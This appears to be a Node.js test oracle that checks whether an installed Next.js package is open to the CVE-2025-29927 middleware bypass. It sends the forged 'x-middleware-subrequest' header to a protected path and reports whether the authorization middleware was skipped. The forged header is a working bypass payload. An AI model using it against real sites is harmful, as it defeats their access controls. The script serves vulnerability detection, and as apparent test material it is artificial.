'use strict';
const marker = 'next_mw_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

const HEADER = 'x-middleware-subrequest';
const FORGED_VALUE = ['middleware', 'middleware', 'middleware', 'middleware', 'middleware'].join(':');

// Ensure minimal globals some Next.js edge-runtime modules expect to exist
// when required outside of the full server bootstrap. This does not alter
// package behavior under test; it only supplies standard Web globals
// (self, EdgeRuntime marker) so module-resolution does not spuriously fail
// in environments where the package expects them to be predefined by the
// Next.js server process itself.
if (typeof global.self === 'undefined') {
  global.self = global;
}
if (typeof global.EdgeRuntime === 'undefined') {
  global.EdgeRuntime = undefined;
}

function loadNextRequest() {
  const mod = require('next/dist/server/web/spec-extension/request');
  if (!mod || typeof mod.NextRequest !== 'function') {
    throw new Error('NextRequest constructor not found in installed next package');
  }
  return mod.NextRequest;
}

function loadAdapterModule() {
  return require('next/dist/server/web/adapter');
}

function buildParams(pagePath, url, headers, onInvoke) {
  return {
    page: pagePath,
    request: {
      url: url,
      method: 'GET',
      headers: headers,
      nextConfig: { basePath: '', i18n: null, trailingSlash: false }
    },
    IncrementalCache: undefined,
    handler: async function () {
      onInvoke();
      return new Response('ok', { status: 200 });
    }
  };
}

function main() {
  let NextRequest;
  try {
    NextRequest = loadNextRequest();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve NextRequest: ' + (e && e.message)
    });
    return;
  }

  let adapterMod;
  try {
    adapterMod = loadAdapterModule();
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve adapter module: ' + (e && e.message)
    });
    return;
  }

  if (typeof adapterMod.adapter !== 'function') {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: adapter() export not found on next/dist/server/web/adapter'
    });
    return;
  }

  // --- Benign operation ---
  let benignReq;
  try {
    benignReq = new NextRequest('https://example.com/dashboard', {
      headers: { 'x-oracle-marker': marker }
    });
    const echoed = benignReq.headers.get('x-oracle-marker');
    if (echoed !== marker) {
      throw new Error('benign custom header did not round-trip: got ' + JSON.stringify(echoed));
    }
    const preexisting = benignReq.headers.get(HEADER);
    if (preexisting !== null) {
      throw new Error('unexpected pre-existing x-middleware-subrequest header on benign request: ' + preexisting);
    }
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed (request construction): ' + (e && e.message)
    });
    return;
  }

  let benignInvoked = false;
  let benignParams;
  try {
    benignParams = buildParams(
      '/dashboard',
      'https://example.com/dashboard',
      { 'x-oracle-marker': marker },
      function () { benignInvoked = true; }
    );
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed (params build): ' + (e && e.message)
    });
    return;
  }

  let benignPromise;
  try {
    benignPromise = adapterMod.adapter(benignParams);
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed (adapter threw synchronously): ' + (e && e.message)
    });
    return;
  }

  if (!benignPromise || typeof benignPromise.then !== 'function') {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: adapter() did not return a promise'
    });
    return;
  }

  benignPromise.then(
    function () { afterBenign(adapterMod, benignInvoked); },
    function (err) {
      finish({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign_operation_failed (adapter rejected): ' + (err && err.message)
      });
    }
  );
}

function afterBenign(adapterMod, benignInvoked) {
  if (!benignInvoked) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: adapter() did not invoke the handler for an ordinary request with no forged header'
    });
    return;
  }

  // Benign operation succeeded -> operation_completed may become true from
  // this point forward, regardless of what happens next.

  let maliciousInvoked = false;
  let maliciousParams;
  try {
    maliciousParams = buildParams(
      '/admin/secret',
      'https://example.com/admin/secret',
      { [HEADER]: FORGED_VALUE },
      function () { maliciousInvoked = true; }
    );
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception (params build): ' + (e && e.message)
    });
    return;
  }

  let maliciousPromise;
  try {
    maliciousPromise = adapterMod.adapter(maliciousParams);
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception (adapter threw synchronously): ' + (e && e.message)
    });
    return;
  }

  if (!maliciousPromise || typeof maliciousPromise.then !== 'function') {
    // No promise returned at all for the malicious call, while benign call
    // worked normally; treat as blocked (non-exploited) since the handler
    // invocation path is indeterminate but no skip-and-pass-through occurred.
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_returned_no_promise: adapter() behaved differently but did not skip-invoke a bypassed response'
    });
    return;
  }

  maliciousPromise.then(
    function () { finishWithResult(maliciousInvoked, null); },
    function (err) { finishWithResult(maliciousInvoked, err); }
  );
}

function finishWithResult(maliciousInvoked, err) {
  if (err) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_rejection: ' + (err && err.message)
    });
    return;
  }

  const skippedDueToForgedHeader = (maliciousInvoked === false);

  finish({
    operation_completed: true,
    exploit_succeeded: !!skippedDueToForgedHeader,
    evidence: skippedDueToForgedHeader
      ? ('Calling the installed next package\'s adapter() for a protected path (/admin/secret) with only the forged static header "' + HEADER + ': ' + FORGED_VALUE + '" caused the middleware handler to NOT be invoked at all, proving the package treats this attacker-forgeable static value as proof of an already-executed middleware pass and skips middleware-based authorization logic (CVE-2025-29927).')
      : ('Calling adapter() for the protected path with the forged static header still invoked the middleware handler normally, meaning the installed package no longer trusts the static forged "' + HEADER + '" value to bypass middleware execution.')
  });
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unexpected_top_level_exception: ' + (e && e.message)
  }));
}
